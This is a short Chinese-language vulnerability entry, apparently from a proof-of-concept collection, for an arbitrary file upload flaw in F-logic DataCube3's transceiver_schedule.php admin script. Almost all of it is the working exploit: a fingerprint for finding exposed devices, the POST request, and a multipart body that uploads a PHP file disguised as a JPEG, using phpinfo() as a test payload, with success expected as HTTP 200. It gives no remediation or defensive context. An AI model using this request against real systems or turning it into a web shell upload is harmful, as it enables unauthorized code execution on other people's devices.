# F-logicDataCube3transceiver_schedule.php任意文件上传漏洞

- **系统**：F-logicDataCube3transceiver_schedule.php　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title=="DataCube3"`
- **请求**：`POST /admin/transceiver_schedule.php?usb_schedule HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVwMNX77L…`

**请求体 / payload**
```
-----------------------------113389720123090127612523184396
Content-Disposition: form-data; name="upload_file"; filename="dudesite.php"
Content-Type: image/jpeg
<?php phpinfo();?>
-----------------------------113389720123090127612523184396
```
- **预期**：200　|　—